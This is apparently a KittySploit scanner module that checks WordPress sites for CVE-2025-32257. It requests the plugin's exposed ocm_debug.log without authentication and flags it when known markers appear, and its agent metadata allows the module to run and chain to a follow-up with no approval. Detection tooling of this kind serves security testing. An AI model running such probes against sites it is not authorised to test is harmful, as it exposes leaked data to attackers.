#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""1 Click WordPress Migration <= 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': '1 Click WordPress Migration <= 2.2 - Unauthenticated Information Disclsoure Detection',
        'description': '1 Click WordPress Migration <= 2.2 contains an information disclosure caused by uncleared debug information, letting attackers retrieve embedded sensitive data, exploit requires no specific privileges.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wpscan', 'wordpress', 'wp-plugin', '1clickmigration', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/03211216-8cc9-49f9-83da-9fbc57554816/'],
        'cve': 'CVE-2025-32257',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/1-click-migration/ocm_debug.log', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('debug log content', 'SYSLOG', 'Archiving plugins',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="1 Click WordPress Migration <= 2.2 - Unauthenticated Information Disclsoure detected",
                path='/wp-content/plugins/1-click-migration/ocm_debug.log',
            )
            return True
        return False

